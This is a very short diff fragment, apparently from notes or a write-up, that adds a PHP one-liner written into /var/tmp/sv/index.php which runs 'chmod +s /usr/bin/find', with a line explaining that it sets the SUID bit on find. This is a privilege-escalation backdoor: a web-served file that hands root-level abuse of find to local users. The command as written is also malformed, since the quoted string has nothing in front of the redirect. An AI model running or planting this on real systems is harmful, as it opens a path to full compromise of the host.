@@ -1,0 +1,3 @@
+"<?php system('chmod +s /usr/bin/find'); ?>" > /var/tmp/sv/index.php
+
+The above command would set an suid bit for find
